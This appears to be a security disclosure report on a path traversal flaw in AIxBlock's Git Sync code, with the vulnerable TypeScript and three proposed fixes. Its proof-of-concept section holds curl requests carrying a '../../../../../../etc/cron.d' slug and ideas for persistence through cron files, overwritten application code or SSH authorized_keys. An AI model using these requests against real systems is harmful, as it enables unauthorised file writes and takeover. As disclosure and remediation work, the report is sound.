# 🟠 HIGH: Path Traversal in Git Sync Feature Enables Arbitrary File Write

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 3.1: 8.6) |
| **Vulnerability Type** | CWE-22: Path Traversal |
| **Affected Component** | `workflow/packages/backend/api/src/app/ee/project-release/git-sync/git-helper.ts` |
| **Attack Vector** | Network (Remote) |
| **Privileges Required** | Low (Authenticated user with git sync access) |
| **User Interaction** | None |

---

## 🔍 Vulnerability Description

The Git Sync feature constructs file system paths using user-controlled input (`gitRepo.slug`) without proper sanitization. An attacker can supply a malicious `slug` value containing path traversal sequences (`../`) to write files outside the intended directory, potentially overwriting critical system files or injecting malicious code.

### Vulnerable Code Location
**File:** `workflow/packages/backend/api/src/app/ee/project-release/git-sync/git-helper.ts`  
**Lines:** 40-58

```typescript
async function createGitRepoAndReturnPaths(
    gitRepo: GitRepo,
    userId: string,
): Promise<{ flowFolderPath: string, git: SimpleGit, stateFolderPath: string, connectionsFolderPath: string }> {
    const tmpFolder = path.join('/', 'tmp', 'repo', gitRepo.projectId)
    // ...
    const flowFolderPath = path.join(
        tmpFolder,
        'projects',
        gitRepo.slug,  // ⚠️ USER CONTROLLED - NO SANITIZATION
        'flows',
    )
    const connectionsFolderPath = path.join(
        tmpFolder,
        'projects',
        gitRepo.slug,  // ⚠️ USER CONTROLLED - NO SANITIZATION
        'connections',
    )
    // ...
    const stateFolderPath = path.join(
        tmpFolder,
        'projects',
        gitRepo.slug,  // ⚠️ USER CONTROLLED - NO SANITIZATION
        'state',
    )
```

### Related Vulnerable File Operations
**File:** `workflow/packages/backend/api/src/app/ee/project-release/git-sync/git-sync-helper.ts`  
**Lines:** 44-50

```typescript
async upsertFlowToGit({ fileName, flow, flowFolderPath, connections, connectionsFolderPath }: UpsertFlowIntoProjectParams): Promise<void> {
    const flowJsonPath = path.join(flowFolderPath, `${fileName}.json`)
    await fs.mkdir(path.dirname(flowJsonPath), { recursive: true })
    await fs.writeFile(flowJsonPath, JSON.stringify(flow, null, 2))  // ⚠️ WRITES TO ATTACKER-CONTROLLED PATH
```

---

## 🧠 Impact Assessment

**Confidentiality:** MEDIUM - Can read files via git operations  
**Integrity:** HIGH - Can write/overwrite arbitrary files  
**Availability:** HIGH - Can corrupt critical system files

### Attack Scenarios:

1. **Arbitrary File Write**
   - Write malicious files to any writable directory
   - Overwrite configuration files to change system behavior

2. **Code Injection**
   - Write to web-accessible directories to inject scripts
   - Overwrite application code with backdoored versions

3. **Credential Theft**
   - Write to SSH directories (`~/.ssh/authorized_keys`)
   - Gain persistent access to the system

4. **Container Escape (in containerized deployments)**
   - Write to mounted volumes
   - Potentially escape container boundaries

---

## 📸 Proof of Concept

### Step 1: Configure malicious git repository
```bash
# Create a git repo configuration with path traversal slug
curl -X POST "https://api.aixblock.io/v1/git-repos" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "remoteUrl": "git@github.com:attacker/repo.git",
    "branch": "main",
    "slug": "../../../../../../etc/cron.d",
    "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\n..."
  }'
```

### Step 2: Trigger sync operation
```bash
# Sync will write flow files to /tmp/repo/{projectId}/projects/../../../../../../etc/cron.d/flows/
# Which resolves to: /etc/cron.d/flows/

curl -X POST "https://api.aixblock.io/v1/git-repos/{repoId}/push" \
  -H "Authorization: Bearer $TOKEN"
```

### Step 3: Verify path traversal
```
Expected path: /tmp/repo/abc123/projects/myproject/flows/
Actual path:   /etc/cron.d/flows/  (DIRECTORY TRAVERSAL!)
```

### Step 4: Exploit for code execution via cron
```bash
# Attacker's flow.json is written as /etc/cron.d/flows/backdoor.json
# If the file format is compatible or can be crafted, cron will execute it

# Alternative: Write to /tmp/repo/{projectId}/projects/../../app/dist/
# Overwrite compiled JavaScript in the application directory
```

---

## ✅ Proposed Fix

### Option 1: Sanitize Slug Input (Recommended)

```typescript
// git-helper.ts

function sanitizeSlug(slug: string): string {
    // Remove path traversal sequences
    let sanitized = slug
        .replace(/\.\./g, '')           // Remove ..
        .replace(/[\/\\]+/g, '-')       // Replace path separators with dash
        .replace(/[^a-zA-Z0-9\-_]/g, '') // Only allow safe characters
        .replace(/^-+|-+$/g, '');       // Trim leading/trailing dashes
    
    // Ensure non-empty result
    if (!sanitized || sanitized.length === 0) {
        throw new AIxBlockError({
            code: ErrorCode.VALIDATION,
            params: { message: 'Invalid slug: must contain alphanumeric characters' },
        });
    }
    
    // Limit length
    if (sanitized.length > 64) {
        sanitized = sanitized.substring(0, 64);
    }
    
    return sanitized;
}

async function createGitRepoAndReturnPaths(
    gitRepo: GitRepo,
    userId: string,
): Promise<...> {
    // Sanitize slug before use
    const safeSlug = sanitizeSlug(gitRepo.slug);
    
    const tmpFolder = path.join('/', 'tmp', 'repo', gitRepo.projectId);
    
    const flowFolderPath = path.join(tmpFolder, 'projects', safeSlug, 'flows');
    
    // ... rest of function
}
```

### Option 2: Validate Resolved Path Stays Within Bounds

```typescript
// git-helper.ts

function validatePathWithinBase(basePath: string, targetPath: string): void {
    const resolvedBase = path.resolve(basePath);
    const resolvedTarget = path.resolve(targetPath);
    
    if (!resolvedTarget.startsWith(resolvedBase + path.sep)) {
        throw new AIxBlockError({
            code: ErrorCode.AUTHORIZATION,
            params: { 
                message: 'Path traversal detected: target path escapes base directory' 
            },
        });
    }
}

async function createGitRepoAndReturnPaths(
    gitRepo: GitRepo,
    userId: string,
): Promise<...> {
    const tmpFolder = path.join('/', 'tmp', 'repo', gitRepo.projectId);
    
    const flowFolderPath = path.join(tmpFolder, 'projects', gitRepo.slug, 'flows');
    
    // Validate before creating directory
    validatePathWithinBase(tmpFolder, flowFolderPath);
    
    await fs.mkdir(flowFolderPath, { recursive: true });
    
    // ... rest of function
}
```

### Option 3: Use UUID Instead of User-Controlled Slug

```typescript
// Eliminate user-controlled path components entirely

async function createGitRepoAndReturnPaths(
    gitRepo: GitRepo,
    userId: string,
): Promise<...> {
    // Use git repo ID (system-generated UUID) instead of user slug
    const safeIdentifier = gitRepo.id;  // Already a validated UUID
    
    const tmpFolder = path.join('/', 'tmp', 'repo', gitRepo.projectId);
    const flowFolderPath = path.join(tmpFolder, 'projects', safeIdentifier, 'flows');
    
    // Store slug as metadata only, not as path component
    // ...
}
```

---

## 🔗 References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Node.js path.resolve() Security](https://nodejs.org/api/path.html#pathresolvepaths)

---

## 📋 Checklist

- [x] Repository starred
- [x] Repository forked
- [x] Vulnerability verified in codebase
- [x] Impact assessment provided
- [x] PoC outline included
- [x] Fix proposal included (3 options)

---

**Reported by:** Security Researcher  
**Date:** December 28, 2025
